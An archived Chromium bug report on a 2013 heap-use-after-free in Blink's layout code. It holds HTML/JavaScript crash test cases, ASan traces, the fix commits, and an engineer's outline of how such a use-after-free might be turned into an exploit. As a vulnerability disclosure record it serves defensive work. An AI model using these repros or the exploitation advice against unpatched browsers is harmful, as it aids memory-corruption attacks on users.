# Heap-use-after-free in WebCore::RenderObjectChildList::destroyLeftoverChildren

| Field | Value |
|-------|-------|
| **Issue ID** | [40078014](https://issues.chromium.org/issues/40078014) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Layout |
| **Reporter** | li...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2013-08-30 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

heap-use-after-free in shadowroot.

**VERSION**  

Chrome Version: [28.0.1500.95] + [stable], [29.0.1547.57] + [beta]  

Operating System: [ubuntu 13.04]

**REPRODUCTION CASE**

<html>
<style>
.absolutePosition { position: fixed; }
.float:before { float: right; content: ''; }
.float:first-letter { float: right; }
.inline::first-letter { content: ''; }
</style>
<script>
function go() {
parent = document.getElementById('parent');
child = document.getElementById('child');
document.body.offsetTop;
child.setAttribute('class', 'inline');
setTimeout('parent.webkitCreateShadowRoot()',100);
}
window.onload = go;
</script>
<div class="float" id="parent">
<div class="absolutePosition" id="child"></div>
A
</div>
</html>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION** cmdStr : [chrome --disable-setuid-sandbox --user-data-dir=../tmp/profile\_1 -translate --incognito --new-window --no-default-browser-check --allow-file-access-from-files --no-first-run 2>&1|./asan\_symbolize.py|c++filt]

==18924==ERROR: AddressSanitizer: heap-use-after-free on address 0x60f000005708 at pc 0x7f82250c2370 bp 0x7fffd45640f0 sp 0x7fffd45640e8  

READ of size 8 at 0x60f000005708 thread T0 (chrome)  

#0 0x7f82250c236f in firstChild /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObjectChildList.h:43  

#1 0x7f8224dd2087 in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:257  

#2 0x7f82250bb729 in destroy /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObject.cpp:2580  

#3 0x7f82240a2014 in detach /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:1107  

#4 0x7f8224153c84 in lazyReattach /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.h:928  

#5 0x7f822415a04d in addShadowRoot /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/shadow/ElementShadow.cpp:41  

#6 0x7f822404b5de in createShadowRoot /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1570  

#7 0x7f822434f067 in webkitCreateShadowRootMethod /mnt/scratch0/tmpbuild/src/out/Release/gen/webcore/bindings/V8Element.cpp:3545  

#8 0x7f82276f18c3 in Call /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/arguments.cc:99  

#9 0x7f822772e3ba in HandleApiCallHelper<false> /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/builtins.cc:1276  

#10 0x2e0e14d0688d in  

0x60f000005708 is located 136 bytes inside of 176-byte region [0x60f000005680,0x60f000005730)  

freed by thread T0 (chrome) here:  

#0 0x7f8221ad48f1 in \_\_interceptor\_free *asan\_rtl*  

#1 0x7f8224dde6a8 in collapseAnonymousBoxChild /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:1157  

#2 0x7f8224ddfc78 in removeChild /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:1278  

#3 0x7f82250b9ccf in remove /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObject.h:917  

#4 0x7f8224ef66a3 in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBoxModelObject.cpp:176  

#5 0x7f8224eaa8a6 in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBox.cpp:168  

#6 0x7f8224dd25ff in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:298  

#7 0x7f82250bb729 in destroy /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObject.cpp:2580  

#8 0x7f822516d1fe in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderTextFragment.cpp:74  

#9 0x7f82250bb729 in destroy /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObject.cpp:2580  

#10 0x7f82250c21c3 in destroyLeftoverChildren /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObjectChildList.cpp:46  

#11 0x7f8224dd2087 in willBeDestroyed /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:257  

#12 0x7f82250bb729 in destroy /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderObject.cpp:2580  

#13 0x7f82240a2014 in detach /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:1107  

#14 0x7f8224153c84 in lazyReattach /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.h:928  

#15 0x7f822415a04d in addShadowRoot /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/shadow/ElementShadow.cpp:41  

#16 0x7f822404b5de in createShadowRoot /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1570  

#17 0x7f822434f067 in webkitCreateShadowRootMethod /mnt/scratch0/tmpbuild/src/out/Release/gen/webcore/bindings/V8Element.cpp:3545  

#18 0x7f82276f18c3 in Call /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/arguments.cc:99  

#19 0x7f822772e3ba in HandleApiCallHelper<false> /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/builtins.cc:1276  

#20 0x2e0e14d0688d in  

#21 0x2e0e14d56c57 in  

#22 0x2e0e14d2acc3 in  

#23 0x2e0e14d07b56 in  

#24 0x7f82277cd540 in Invoke /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/execution.cc:119  

#25 0x7f82276b4b70 in Run /mnt/scratch0/tmpbuild/src/out/Release/../../v8/src/api.cc:1968  

#26 0x7f8224adebcd in runCompiledScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/V8ScriptRunner.cpp:95  

#27 0x7f8224a805c9 in compileAndRunScript /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/ScriptController.cpp:241  

#28 0x7f8224cd618f in execute /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/bindings/v8/ScheduledAction.cpp:103  

#29 0x7f8225a7cda7 in fired /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/page/DOMTimer.cpp:160  

previously allocated by thread T0 (chrome) here:  

#0 0x7f8221ad4a31 in \_\_interceptor\_malloc *asan\_rtl*  

#1 0x7f8224e407eb in createAnonymous /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:245  

#2 0x7f8224ddc99c in createAnonymousBlock /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.h:271  

#3 0x7f8224dd899b in addChildIgnoringAnonymousColumnBlocks /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/rendering/RenderBlock.cpp:887  

#4 0x7f82240c5db1 in createRendererForElementIfNeeded /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/NodeRenderingContext.cpp:275  

#5 0x7f8224046e0f in createRendererIfNeeded /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1298  

#6 0x7f8224049ca6 in reattach /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.h:913  

#7 0x7f822404a507 in recalcStyle /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1522  

#8 0x7f822404a507 in recalcStyle /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1522  

#9 0x7f822404a507 in recalcStyle /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Element.cpp:1522  

#10 0x7f8223fd14a2 in recalcStyle /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1706  

#11 0x7f8223fd25f3 in updateStyleIfNeeded /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:1753  

#12 0x7f82259a4b8f in checkCompleted /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:709  

#13 0x7f82259a11e4 in finishedParsing /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:642  

#14 0x7f8223feffdb in finishedParsing /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:4157  

#15 0x7f822acce240 in end /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:725  

#16 0x7f822acd1f74 in processParsedChunkFromBackgroundParser /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:431  

#17 0x7f822accf474 in pumpPendingSpeculations /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:461  

#18 0x7f822acd025e in didReceiveParsedChunkFromBackgroundParser /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:311  

#19 0x7f822ad9d4bb in PassOwnPtr /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:210  

#20 0x7f82285691c1 in operator() /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:577  

#21 0x7f82283007c7 in Run /mnt/scratch0/tmpbuild/src/out/Release/../../base/callback.h:396  

#22 0x7f8228300f54 in DeferOrRunPendingTask /mnt/scratch0/tmpbuild/src/out/Release/../../base/message\_loop/message\_loop.cc:496  

#23 0x7f8228301ff0 in DoWork /mnt/scratch0/tmpbuild/src/out/Release/../../base/message\_loop/message\_loop.cc:688  

#24 0x7f82283092f1 in Run /mnt/scratch0/tmpbuild/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:29  

#25 0x7f82282ff5b9 in RunInternal /mnt/scratch0/tmpbuild/src/out/Release/../../base/message\_loop/message\_loop.cc:441  

#26 0x7f82283448c3 in Run /mnt/scratch0/tmpbuild/src/out/Release/../../base/run\_loop.cc:45  

#27 0x7f82282fdf0d in Run /mnt/scratch0/tmpbuild/src/out/Release/../../base/message\_loop/message\_loop.cc:321  

#28 0x7f8229078762 in RendererMain /mnt/scratch0/tmpbuild/src/out/Release/../../content/renderer/renderer\_main.cc:236  

#29 0x7f822898761e in RunZygote /mnt/scratch0/tmpbuild/src/out/Release/../../content/app/content\_main\_runner.cc:385  

Shadow bytes around the buggy address:  

0x0c1e7fff8a90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c1e7fff8aa0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c1e7fff8ab0: fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1e7fff8ac0: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa  

0x0c1e7fff8ad0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0c1e7fff8ae0: fd[fd]fd fd fd fd fa fa fa fa fa fa fa fa fd fd  

0x0c1e7fff8af0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1e7fff8b00: fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00  

0x0c1e7fff8b10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1e7fff8b20: 00 00 fa fa fa fa fa fa fa fa 00 00 00 00 00 00  

0x0c1e7fff8b30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

ASan internal: fe

## Timeline

### cl...@chromium.org (2013-08-30)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=6574016059932672

### in...@chromium.org (2013-08-30)

Can you reproduce it on Chromium trunk or dev. It looks like we already fixed, we can't reproduce it on CF.

### li...@gmail.com (2013-08-30)

My fuzzer can hit uaf on 220499 quite frequently, but have no simple test cases yet.



### kc...@chromium.org (2013-08-30)

 lifeasageek@, thanks for reporting these bugs. A small suggestion: 
asan has a run-time flag strip_path_prefix:
When strip_path_prefix=PREFIX the substring .*PREFIX will be removed from the reported file names.
So, if you set env. var. ASAN_OPTIONS=strip_path_prefix=/mnt/scratch0/tmpbuild/src/out/Release/../../
your reports will be more compact. 

### li...@gmail.com (2013-08-30)

kcc@ sure, I'll keep in mind that.

### li...@gmail.com (2013-08-30)

New testcase, hit uaf on 220499 and 220549. Since I cannot make this work including beta 29.0.1547.57, I simply played a little trick.

<html>                                                                                                                                                                        
<style>                                                                                                                                                                       
.absolutePosition { position: fixed; }                                                                                                                                        
.float:before { float: right; content: ''; }                                                                                                                                  
.float:first-letter { float: right; }                                                                                                                                         
.inline::first-letter { content: ''; }                                                                                                                                        
</style>                                                                                                                                                                      
<script>                                                                                                                                                                      
function go() {                                                                                                                                                               
    document.body.offsetTop;                                                                                                                                                  
    parent = document.getElementById('parent');                                                                                                                               
    child = document.getElementById('child');                                                                                                                                 
    child.setAttribute('class', 'inline');                                                                                                                                    
    document.body.offsetTop;                                                                                                                                                  
    parent.removeChild(child);                                                                                                                                                
    document.body.offsetTop;                                                                                                                                                  
    if(Math.floor(Math.random()*2) == 0)// beta 29.0.1547.57                                                                                                                  
        setTimeout('parent.webkitCreateShadowRoot()',0);                                                                                                                      
    else // trunk 220499, 220549                                                                                                                                              
        parent.normalize();                                                                                                                                                   
                                                                                                                                                                              
    document.location.href=document.URL; // try again                                                                                                                                      
}                                                                                                                                                                             
window.onload = go;                                                                                                                                                           
</script>                                                                                                                                                                     
<div class="float" id="parent">                                                                                                                                               
<div class="absolutePosition" id="child"></div>                                                                                                                               
A                                                                                                                                                                             
</div>                                                                                                                                                                        
</html>                                                                                                                                                                       
                                                                                                                                                                              




### cl...@chromium.org (2013-08-30)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5438960356556800

### cl...@chromium.org (2013-08-30)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5438960356556800

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000059ad0
Crash State:
  - crash stack -
  WebCore::RenderObjectChildList::destroyLeftoverChildren
  WebCore::RenderBlock::willBeDestroyed
  - free stack -
  WebCore::RenderBlock::collapseAnonymousBoxChild
  WebCore::RenderBlock::removeChild
  

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95BdRNuuDG0kJYa-YSjEaNCU6q-Ygdgz4dK_-rdWEuMPHDDhHhx-7SPx8gACXEkVfnrTu2rFaIbCy5GJk3IV1P2s431EMJvJugctN2QyFoxGh8NL6NNlp1Rm5UHD65Yqm39-J03eVMUFCONkUJjFatrp38IkQ

Unreliable crash found using linux_tsan_chrome_mp job type (history_size=6).


### li...@gmail.com (2013-09-02)

Should I submit the testcase with "fully reproducible crash" to get confirmed? It is pretty strange to me though, because I tried many different chrome versions, and it always hit uaf for this case. Or, is it because I used a "refresh" trick?

### in...@chromium.org (2013-09-02)

lifeasageek@, this is a fully reliable crash on ClusterFuzz. don't worry about providing anything else.

### li...@gmail.com (2013-09-02)

inferno@ thanks!

### in...@chromium.org (2013-09-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-03)

From C#0, looks shadow root related.

### cl...@chromium.org (2013-09-03)

[Comment Deleted]

### cl...@chromium.org (2013-09-03)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5438960356556800

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000059ad0
Crash State:
  - crash stack -
  WebCore::RenderObjectChildList::destroyLeftoverChildren
  WebCore::RenderBlock::willBeDestroyed
  - free stack -
  WebCore::RenderBlock::collapseAnonymousBoxChild
  WebCore::RenderBlock::removeChild
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=219161:219234

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95BdRNuuDG0kJYa-YSjEaNCU6q-Ygdgz4dK_-rdWEuMPHDDhHhx-7SPx8gACXEkVfnrTu2rFaIbCy5GJk3IV1P2s431EMJvJugctN2QyFoxGh8NL6NNlp1Rm5UHD65Yqm39-J03eVMUFCONkUJjFatrp38IkQ

Unreliable crash found using linux_tsan_chrome_mp job type (history_size=6).


### do...@chromium.org (2013-09-03)

hayato is head Shadow DOM vampire now, he can fix this or feed it to a minion.

### ha...@chromium.org (2013-09-04)

It's P1, isn't it?
Let me take a look.

### in...@chromium.org (2013-09-04)

Yes, high severity bugs are p1.

### ha...@chromium.org (2013-09-04)

I couldn't reproduce the issue using the test case in C#0.


I could reproduce the issue using the test case in C#16.

- https://cluster-fuzz.appspot.com/testcase?key=5438960356556800
- https://cluster-fuzz.appspot.com/viewer?blob_key=AMIfv95BdRNuuDG0kJYa-YSjEaNCU6q-Ygdgz4dK_-rdWEuMPHDDhHhx-7SPx8gACXEkVfnrTu2rFaIbCy5GJk3IV1P2s431EMJvJugctN2QyFoxGh8NL6NNlp1Rm5UHD65Yqm39-J03eVMUFCONkUJjFatrp38IkQ


It seems Shadow root is not related at all.


### ha...@chromium.org (2013-09-04)

Could someone take a look at this?

### in...@chromium.org (2013-09-04)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-05)

[Empty comment from Monorail migration]

### le...@chromium.org (2013-09-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-09-06)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157392

------------------------------------------------------------------------
r157392 | leviw@chromium.org | 2013-09-06T23:40:42.189245Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css-generated-content/normalize-with-first-letter-and-before-content-crash.html?r1=157392&r2=157391&pathrev=157392
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderBlock.cpp?r1=157392&r2=157391&pathrev=157392
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderBlock.h?r1=157392&r2=157391&pathrev=157392
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css-generated-content/normalize-with-first-letter-and-before-content-crash-expected.txt?r1=157392&r2=157391&pathrev=157392

Avoid collapsing anonymous block children already being destroyed

When normalizing a block with anonymous blocks for first-letter,
before content, and contained text, a collapsing anonymous block
cascade is triggered that attempts to collapse the contained
text's anonymous block within its destruction method. To avoid
this, adding logic to bail early if we're already destroying
the child anonymous block we're trying to collapse.

While in the function, doing a little cleanup to make it more
obvious that it only operates on RenderBlocks, not RenderBoxes,
and updating some of the comments to hopefully be more useful.

BUG=282088

Review URL: https://chromiumcodereview.appspot.com/23463021
------------------------------------------------------------------------

### in...@chromium.org (2013-09-07)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-07)

ClusterFuzz has detected this issue as fixed in range 221902:221913.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5438960356556800

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000059ad0
Crash State:
  - crash stack -
  WebCore::RenderObjectChildList::destroyLeftoverChildren
  WebCore::RenderBlock::willBeDestroyed
  - free stack -
  WebCore::RenderBlock::collapseAnonymousBoxChild
  WebCore::RenderBlock::removeChild
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=219161:219234
Fixed: https://cluster-fuzz.appspot.com/revisions?range=221902:221913

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95BdRNuuDG0kJYa-YSjEaNCU6q-Ygdgz4dK_-rdWEuMPHDDhHhx-7SPx8gACXEkVfnrTu2rFaIbCy5GJk3IV1P2s431EMJvJugctN2QyFoxGh8NL6NNlp1Rm5UHD65Yqm39-J03eVMUFCONkUJjFatrp38IkQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### bu...@chromium.org (2013-09-10)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157549

------------------------------------------------------------------------
r157549 | leviw@chromium.org | 2013-09-10T21:06:45.890526Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/rendering/RenderBlock.h?r1=157549&r2=157548&pathrev=157549
   A http://src.chromium.org/viewvc/blink/branches/chromium/1599/LayoutTests/fast/css-generated-content/normalize-with-first-letter-and-before-content-crash-expected.txt?r1=157549&r2=157548&pathrev=157549
   A http://src.chromium.org/viewvc/blink/branches/chromium/1599/LayoutTests/fast/css-generated-content/normalize-with-first-letter-and-before-content-crash.html?r1=157549&r2=157548&pathrev=157549
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/rendering/RenderBlock.cpp?r1=157549&r2=157548&pathrev=157549

Merge 157392 "Avoid collapsing anonymous block children already ..."

> Avoid collapsing anonymous block children already being destroyed
> 
> When normalizing a block with anonymous blocks for first-letter,
> before content, and contained text, a collapsing anonymous block
> cascade is triggered that attempts to collapse the contained
> text's anonymous block within its destruction method. To avoid
> this, adding logic to bail early if we're already destroying
> the child anonymous block we're trying to collapse.
> 
> While in the function, doing a little cleanup to make it more
> obvious that it only operates on RenderBlocks, not RenderBoxes,
> and updating some of the comments to hopefully be more useful.
> 
> BUG=282088
> 
> Review URL: https://chromiumcodereview.appspot.com/23463021

TBR=leviw@chromium.org

Review URL: https://codereview.chromium.org/23757029
------------------------------------------------------------------------

### in...@chromium.org (2013-09-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### in...@chromium.org (2013-09-26)

Removing incorrect Release-0 which is reserved for bugs impacting stable.

### in...@chromium.org (2013-09-26)

This code has always existed, i can't believe this is a regression.

### mb...@chromium.org (2013-09-26)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-09-27)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-09-28)

Looks hard to control. $1000.

### li...@gmail.com (2013-09-28)

Out of curiosity, is this the case of being hardened by the partition alloc? I tried a bit to control this guy but nothing worked out. Just want to know and ask what would be the reasonable approaches to beat this one (still, just for fulfilling my curiosity!) 

### sc...@gmail.com (2013-09-28)

Hello! I'm excited you've taken an interest :)

partitionAlloc() is part of it but not the main part:
It looks like the free'd RenderObjectChildList is a member of a RenderBlock. RenderBlocks are allocated out of the rendering partition. So for any use-after-free situation on a RenderBlock, you will only be able to place other rendering partition objects "on top" of the freed RenderBlock. For example, you couldn't place arbitrary bytes easily on top of the freed RenderBlock because strings (StringImpl, CString etc.) and array buffers (Uint8ArrayBuffer etc.) are allocated in a different heap.

The main part of the problem with control here is that both the free and the use-after-free happen within the same JavaScript call: webkitCreateShadowRoot. So you don't get to run arbitrary JavaScript to control what object gets put on top of the freed slot.

Of course, as you put it, it still might be possible to "beat this one" :-)
You'd have to trace through the code paths between the free and the use and see:
- What object allocations (of the exact same size as the free'd object) occur.
- Whether you can change the render tree to still get the use-after-free but have different object allocations and different code paths going on.
- Whether the free'd object type can be changed by changing the repro (this will give you different paths forward).

And then, if you can get an object you control on top of the freed object, you'll have to look at what exact options you have in terms of overlaying fields from the overlay object on to the freed object, and whether those fields are touched in the "use" code path.

Also, note that partitionAlloc will only place new objects on top of freed slots if there's an _exact_ object size match.

If you can get a virtual call on a mismatched object type, you may also be able to abuse a useful side effect of the bad virtual call.

In short: I don't think there are any generic techniques here so to take it further would require a lot of study into the exact situation going on here. BTW, if you do play with this and get anywhere interesting, I don't think we'd have any problem re-evaluating the reward.

### li...@gmail.com (2013-09-28)

scarybeast@ Wow... I really appreciate your very kind explanation, and it helped me a lot to better understand how uaf exploitation is working! After reading your explanations, I feel taming this one sounds very very hard? :) Anyway, thanks for giving out the bounty and the great tutorials!

### pa...@chromium.org (2013-10-18)

I just kicked off payment for this reward (and the 3 other issues), so expect to see something in a few weeks - the process is a bit slow. Thanks again for your help making Chrome more secure lifeasageek! :)

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### la...@google.com (2015-01-09)

Migrate from Cr-Blink-Rendering to Cr-Blink-Layout

### gl...@chromium.org (2015-06-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/282088?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078014)*
